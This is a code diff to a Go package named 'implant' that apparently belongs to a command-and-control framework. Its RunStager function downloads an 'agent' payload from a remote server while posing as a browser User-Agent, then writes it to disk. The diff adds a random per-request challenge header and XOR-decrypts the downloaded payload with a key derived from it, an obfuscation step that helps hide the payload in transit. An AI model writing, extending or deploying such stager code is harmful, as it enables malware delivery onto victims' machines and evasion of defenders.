@@ -1,7 +1,10 @@
 package implant
 
 import (
+	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net/http"
@@ -48,12 +51,20 @@ func RunStager(serverURL string) error {
 		},
 	}
 
+	// Generate a 16-byte random challenge for per-request key derivation
+	challenge := make([]byte, 16)
+	if _, err := rand.Read(challenge); err != nil {
+		return fmt.Errorf("generate challenge: %w", err)
+	}
+	hexChallenge := hex.EncodeToString(challenge)
+
 	req, err := http.NewRequest("GET", downloadURL, nil)
 	if err != nil {
 		return fmt.Errorf("create request: %w", err)
 	}
 
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req.Header.Set("X-Client-Token", hexChallenge)
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -69,6 +80,12 @@ func RunStager(serverURL string) error {
 	agentBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50<<20)) // 50MB max
 	if err != nil {
 		return fmt.Errorf("read agent: %w", err)
+	}
+
+	// XOR-decrypt using SHA-256(challenge) as the derived key
+	derived := sha256.Sum256(challenge)
+	for i := range agentBytes {
+		agentBytes[i] ^= derived[i%32]
 	}
 
 	// Write to disk
